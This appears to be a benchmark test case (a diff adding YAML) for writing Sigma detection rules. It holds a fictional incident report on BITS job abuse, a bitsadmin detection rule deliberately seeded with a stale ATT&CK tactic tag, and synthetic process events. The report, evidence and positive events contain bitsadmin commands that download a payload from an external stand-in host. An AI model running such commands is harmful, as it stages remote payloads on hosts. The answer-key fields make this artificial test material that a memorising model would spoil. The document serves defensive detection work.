@@ -1,0 +1,116 @@
+id: D8-03
+role: defective
+defect_class: D8
+evasive: true
+why: attack.defense_evasion is a tactic name that no longer exists in ATT&CK v19.2 (it was renamed attack.stealth).
+  The technique ID attack.t1197 and the other two tactic tags are correct and supported, so only the stale
+  tactic name is wrong.
+expected_gate: G7
+report_text: 'Incident summary, Marrowgate Health (fictional hospital group). The actor used the Windows
+  Background Intelligent Transfer Service as a quiet way to pull a payload from an external host onto
+  the endpoint. On the first affected workstation the process log showed: bitsadmin.exe /transfer syncjob
+  /download /priority normal http://dl.marrowgate-support.test/agent.bin C:\ProgramData\agent.bin and
+  the same job name was reused on later hosts. The transfer job outlived a reboot of the host, and the
+  downloaded file was then started by a separate command. The analysts'' assessment is that the use of
+  bitsadmin with the /transfer and /download switches against an external URL has no legitimate business
+  purpose in this environment, whereas read-only job listing is routine for the service desk. The activity
+  was limited to BITS job abuse in this phase; no other transfer utilities such as certutil were seen.'
+evidence:
+- bitsadmin.exe /transfer syncjob /download /priority normal http://dl.marrowgate-support.test/agent.bin
+  C:\ProgramData\agent.bin
+- the use of bitsadmin with the /transfer and /download switches against an external URL
+logsource: windows_process_creation
+techniques:
+- T1197
+sigma_yaml: |
+  title: BITS Job Download Via Bitsadmin Transfer
+  id: 5b08e6c2-1d93-47aa-8e61-c3f20a74d9b6
+  status: experimental
+  description: Detects bitsadmin creating a download transfer job, a quiet way to pull a payload onto an endpoint.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.execution
+    - attack.persistence
+    - attack.defense_evasion
+    - attack.t1197
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image|endswith: '\bitsadmin.exe'
+      CommandLine|contains|all:
+        - '/transfer'
+        - '/download'
+    condition: selection
+  falsepositives:
+    - Administrators scripting BITS downloads of software packages from an internal server
+  level: medium
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\bitsadmin.exe
+    cmd: bitsadmin.exe /transfer syncjob /download /priority normal http://dl.marrowgate-support.test/agent.bin
+      C:\ProgramData\agent.bin
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\frank
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\bitsadmin.exe
+    cmd: bitsadmin /transfer updjob /download /priority high http://dl.marrowgate-support.test/cfg.dat
+      C:\Users\Public\cfg.dat
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\gina
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\ipconfig.exe
+    cmd: ipconfig.exe /all
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\frank
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\notepad.exe
+    cmd: notepad.exe
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\gina
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\bitsadmin.exe
+    cmd: bitsadmin.exe /list /allusers /verbose
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\svc-helpdesk
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\bitsadmin.exe
+    cmd: bitsadmin.exe /info syncjob /verbose
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\svc-helpdesk
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
